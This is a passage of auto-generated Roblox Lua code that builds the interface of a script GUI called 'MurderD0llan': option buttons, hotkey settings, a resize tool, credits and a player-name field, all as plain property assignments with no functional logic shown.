G2L["81"]["TextWrapped"] = true;
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["81"]["TextSize"] = 16;
G2L["81"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["Text"] = [[- - -  ]];
G2L["81"]["BackgroundTransparency"] = 1;
G2L["81"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1TESTN
G2L["82"] = Instance.new("TextButton", G2L["66"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["TextStrokeTransparency"] = 0;
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["TextSize"] = 20;
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["82"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["82"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["82"]["Name"] = [[TextBoxButton1TESTN]];
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Text"] = [[  Test Notifcation (Text)]];
G2L["82"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.8508771657943726, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1TESTN.UIGradient
G2L["83"] = Instance.new("UIGradient", G2L["82"]);
G2L["83"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1TESTN.TextBox
G2L["84"] = Instance.new("TextBox", G2L["82"]);
G2L["84"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["84"]["TextSize"] = 14;
G2L["84"]["TextWrapped"] = true;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["84"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["84"]["PlaceholderText"] = [[enter...]];
G2L["84"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["84"]["Text"] = [[]];
G2L["84"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.RESETNOTIFCFG
G2L["85"] = Instance.new("TextButton", G2L["66"]);
G2L["85"]["TextWrapped"] = true;
G2L["85"]["TextStrokeTransparency"] = 0;
G2L["85"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["85"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["85"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["85"]["TextSize"] = 20;
G2L["85"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["85"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["85"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["85"]["Name"] = [[RESETNOTIFCFG]];
G2L["85"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["85"]["Text"] = [[  Reset Notif Configuration]];
G2L["85"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.RESETNOTIFCFG.UIGradient
G2L["86"] = Instance.new("UIGradient", G2L["85"]);
G2L["86"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.RESETNOTIFCFG.change
G2L["87"] = Instance.new("TextButton", G2L["85"]);
G2L["87"]["TextWrapped"] = true;
G2L["87"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["87"]["TextSize"] = 14;
G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["87"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["87"]["Name"] = [[change]];
G2L["87"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["Text"] = [[RESET]];
G2L["87"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextLabel
G2L["88"] = Instance.new("TextLabel", G2L["66"]);
G2L["88"]["TextWrapped"] = true;
G2L["88"]["BorderSizePixel"] = 0;
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["88"]["TextSize"] = 16;
G2L["88"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["88"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["88"]["Text"] = [[- - - - - - - -  - - - - -HotKey - - - - -  - - - - -  -  ]];
G2L["88"]["BackgroundTransparency"] = 1;
G2L["88"]["Position"] = UDim2.new(-0.00136239780113101, 0, 0.75, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.HSGKey
G2L["89"] = Instance.new("TextButton", G2L["66"]);
G2L["89"]["TextWrapped"] = true;
G2L["89"]["TextStrokeTransparency"] = 0;
G2L["89"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["89"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["89"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["89"]["TextSize"] = 20;
G2L["89"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["89"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["89"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["89"]["Name"] = [[HSGKey]];
G2L["89"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["89"]["Text"] = [[  Hide / Show GUI - None]];
G2L["89"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);
-- Attributes
G2L["89"]:SetAttribute([[SELECTED_KEY]], [[Unknown]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.HSGKey.UIGradient
G2L["8a"] = Instance.new("UIGradient", G2L["89"]);
G2L["8a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.KeyListener
G2L["8b"] = Instance.new("TextButton", G2L["66"]);
G2L["8b"]["TextWrapped"] = true;
G2L["8b"]["TextStrokeTransparency"] = 0;
G2L["8b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["TextSize"] = 20;
G2L["8b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8b"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["8b"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["8b"]["Name"] = [[KeyListener]];
G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["Text"] = [[  Key Listener [ONLY FOR PC]];
G2L["8b"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);
-- Attributes
G2L["8b"]:SetAttribute([[SELECTED_KEY]], [[Unknown]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.KeyListener.UIGradient
G2L["8c"] = Instance.new("UIGradient", G2L["8b"]);
G2L["8c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextLabel
G2L["8d"] = Instance.new("TextLabel", G2L["66"]);
G2L["8d"]["TextWrapped"] = true;
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8d"]["TextSize"] = 16;
G2L["8d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Text"] = [[- - - - - - - -  - - - - -Others - - - - -  - - - - -  -  ]];
G2L["8d"]["BackgroundTransparency"] = 1;
G2L["8d"]["Position"] = UDim2.new(-0.00136239780113101, 0, 0.75, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.VerticalScrollBarPositionBUTTON
G2L["8e"] = Instance.new("TextButton", G2L["66"]);
G2L["8e"]["TextWrapped"] = true;
G2L["8e"]["TextStrokeTransparency"] = 0;
G2L["8e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["TextSize"] = 18;
G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8e"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["8e"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["8e"]["Name"] = [[VerticalScrollBarPositionBUTTON]];
G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8e"]["Text"] = [[  Vertical Scroll Bar Position]];
G2L["8e"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.VerticalScrollBarPositionBUTTON.UIGradient
G2L["8f"] = Instance.new("UIGradient", G2L["8e"]);
G2L["8f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.VerticalScrollBarPositionBUTTON.change
G2L["90"] = Instance.new("TextButton", G2L["8e"]);
G2L["90"]["TextWrapped"] = true;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["90"]["TextSize"] = 14;
G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["90"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["90"]["Name"] = [[change]];
G2L["90"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["Text"] = [[change]];
G2L["90"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.translategui
G2L["91"] = Instance.new("TextButton", G2L["66"]);
G2L["91"]["TextWrapped"] = true;
G2L["91"]["TextStrokeTransparency"] = 0;
G2L["91"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["91"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["91"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["91"]["TextSize"] = 18;
G2L["91"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["91"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["91"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["91"]["Name"] = [[translategui]];
G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["91"]["Text"] = [[  Try To Translate Script GUI]];
G2L["91"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.translategui.UIGradient
G2L["92"] = Instance.new("UIGradient", G2L["91"]);
G2L["92"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.translategui.change
G2L["93"] = Instance.new("TextButton", G2L["91"]);
G2L["93"]["TextWrapped"] = true;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["93"]["TextSize"] = 14;
G2L["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["93"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["93"]["Name"] = [[change]];
G2L["93"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["Text"] = [[TEST]];
G2L["93"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ReSiZeTool
G2L["94"] = Instance.new("TextButton", G2L["66"]);
G2L["94"]["TextWrapped"] = true;
G2L["94"]["TextStrokeTransparency"] = 0;
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["TextSize"] = 20;
G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["94"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["94"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["94"]["Name"] = [[ReSiZeTool]];
G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["Text"] = [[  ReSiZe GUI Tool]];
G2L["94"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ReSiZeTool.Frame
G2L["95"] = Instance.new("Frame", G2L["94"]);
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["95"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["95"]["Position"] = UDim2.new(0.871874988079071, 0, 0.20588235557079315, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ReSiZeTool.UIGradient
G2L["96"] = Instance.new("UIGradient", G2L["94"]);
G2L["96"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.HorizontalAlignment
G2L["97"] = Instance.new("TextButton", G2L["66"]);
G2L["97"]["TextWrapped"] = true;
G2L["97"]["TextStrokeTransparency"] = 0;
G2L["97"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["97"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["97"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["97"]["TextSize"] = 13;
G2L["97"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["97"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["97"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["97"]["Name"] = [[HorizontalAlignment]];
G2L["97"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["97"]["Text"] = [[  ScrollingFrame Horizontal Alignment]];
G2L["97"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.HorizontalAlignment.UIGradient
G2L["98"] = Instance.new("UIGradient", G2L["97"]);
G2L["98"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.HorizontalAlignment.change
G2L["99"] = Instance.new("TextButton", G2L["97"]);
G2L["99"]["TextWrapped"] = true;
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["99"]["TextSize"] = 14;
G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["99"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["99"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["99"]["Name"] = [[change]];
G2L["99"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["99"]["Text"] = [[change]];
G2L["99"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ISTool
G2L["9a"] = Instance.new("TextButton", G2L["66"]);
G2L["9a"]["TextWrapped"] = true;
G2L["9a"]["TextStrokeTransparency"] = 0;
G2L["9a"]["BorderSizePixel"] = 0;
G2L["9a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9a"]["TextSize"] = 20;
G2L["9a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["9a"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["9a"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["9a"]["Name"] = [[ISTool]];
G2L["9a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9a"]["Text"] = [[  Item Searcher Tool]];
G2L["9a"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ISTool.Frame
G2L["9b"] = Instance.new("Frame", G2L["9a"]);
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["9b"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9b"]["Position"] = UDim2.new(0.871874988079071, 0, 0.20588235557079315, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ISTool.UIGradient
G2L["9c"] = Instance.new("UIGradient", G2L["9a"]);
G2L["9c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextLabel
G2L["9d"] = Instance.new("TextLabel", G2L["66"]);
G2L["9d"]["TextWrapped"] = true;
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9d"]["TextSize"] = 16;
G2L["9d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["Text"] = [[- - - - - - - -  - - - - -credits - - - - -  - - - - -  -  ]];
G2L["9d"]["BackgroundTransparency"] = 1;
G2L["9d"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextLabel1
G2L["9e"] = Instance.new("TextLabel", G2L["66"]);
G2L["9e"]["TextWrapped"] = true;
G2L["9e"]["BorderSizePixel"] = 0;
G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9e"]["TextSize"] = 16;
G2L["9e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["9e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9e"]["Text"] = [[script made by: G0bbyD0llan]];
G2L["9e"]["Name"] = [[TextLabel1]];
G2L["9e"]["BackgroundTransparency"] = 1;
G2L["9e"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextLabel2
G2L["9f"] = Instance.new("TextLabel", G2L["66"]);
G2L["9f"]["TextWrapped"] = true;
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9f"]["TextSize"] = 16;
G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Text"] = [[- YouTube: @G0bbyD0llan57-ee1vl -]];
G2L["9f"]["Name"] = [[TextLabel2]];
G2L["9f"]["BackgroundTransparency"] = 1;
G2L["9f"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextLabel
G2L["a0"] = Instance.new("TextLabel", G2L["66"]);
G2L["a0"]["TextWrapped"] = true;
G2L["a0"]["BorderSizePixel"] = 0;
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a0"]["TextSize"] = 16;
G2L["a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a0"]["Text"] = [[- - - - - - - -  - - - - - - - - - -  - - - - -  -  ]];
G2L["a0"]["BackgroundTransparency"] = 1;
G2L["a0"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.sendfeedback
G2L["a1"] = Instance.new("TextButton", G2L["66"]);
G2L["a1"]["TextWrapped"] = true;
G2L["a1"]["TextStrokeTransparency"] = 0;
G2L["a1"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a1"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a1"]["TextSize"] = 20;
G2L["a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a1"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["a1"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["a1"]["LayoutOrder"] = 55;
G2L["a1"]["Name"] = [[sendfeedback]];
G2L["a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a1"]["Text"] = [[  send feedback]];
G2L["a1"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.sendfeedback.UIGradient
G2L["a2"] = Instance.new("UIGradient", G2L["a1"]);
G2L["a2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.faq
G2L["a3"] = Instance.new("TextButton", G2L["66"]);
G2L["a3"]["TextWrapped"] = true;
G2L["a3"]["TextStrokeTransparency"] = 0;
G2L["a3"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["TextSize"] = 20;
G2L["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a3"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["a3"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["a3"]["LayoutOrder"] = 55;
G2L["a3"]["Name"] = [[faq]];
G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["Text"] = [[  FAQ / Help With Questions]];
G2L["a3"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.faq.UIGradient
G2L["a4"] = Instance.new("UIGradient", G2L["a3"]);
G2L["a4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2
G2L["a5"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["a5"]["Active"] = true;
G2L["a5"]["BorderSizePixel"] = 0;
G2L["a5"]["CanvasSize"] = UDim2.new(0, 0, 0, 931);
G2L["a5"]["TopImage"] = [[]];
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a5"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["a5"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["a5"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a5"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["a5"]["Visible"] = false;
G2L["a5"]["Name"] = [[page_2]];
G2L["a5"]["BottomImage"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.UIListLayout
G2L["a6"] = Instance.new("UIListLayout", G2L["a5"]);
G2L["a6"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["a6"]["Padding"] = UDim.new(0, 5);
G2L["a6"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TextBoxButton1PlayerName
G2L["a7"] = Instance.new("TextButton", G2L["a5"]);
G2L["a7"]["TextWrapped"] = true;
G2L["a7"]["TextStrokeTransparency"] = 0;
G2L["a7"]["BorderSizePixel"] = 0;
G2L["a7"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["TextSize"] = 20;
G2L["a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a7"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["a7"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["a7"]["Name"] = [[TextBoxButton1PlayerName]];
G2L["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["Text"] = [[  Enter Player Here...]];
G2L["a7"]["Position"] = UDim2.new(0.5456903576850891, 0, 0.8142253160476685, 0);

